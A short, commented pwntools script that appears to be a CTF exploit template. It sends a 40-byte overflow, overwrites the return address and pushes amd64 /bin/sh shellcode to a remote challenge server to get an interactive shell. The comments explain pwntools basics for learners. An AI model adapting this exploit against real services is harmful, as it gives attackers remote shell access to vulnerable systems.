from pwn import *

#set the arch of the binary, this can be used internally by pwntools
context.arch = 'amd64'

#process or remote listener that we will communicate with
#p = process("pwn_review")
p = remote("ctf.ropcity.com", 31337)

#https://docs.pwntools.com/en/stable/shellcraft.html
print("lets see some shellcode")
print(pwnlib.shellcraft.amd64.linux.sh())
print("lets see some shellcode ready to be written as bytes")
print(asm(pwnlib.shellcraft.amd64.linux.sh()))

payload = b"A" * 40 + p64(0x0000000000400577) + b'\n'
#send hello to a binary
#p.send("hello")
p.send(payload)
p.send(asm(pwnlib.shellcraft.amd64.linux.sh()))
#receive everything the binary has sent back to the buffer
#p.recv()
#receive 8 bytes
#p.recv(8)
p.interactive()
#pack an address to add it to a 64-bit payload
#p64(0xdeadbeef)
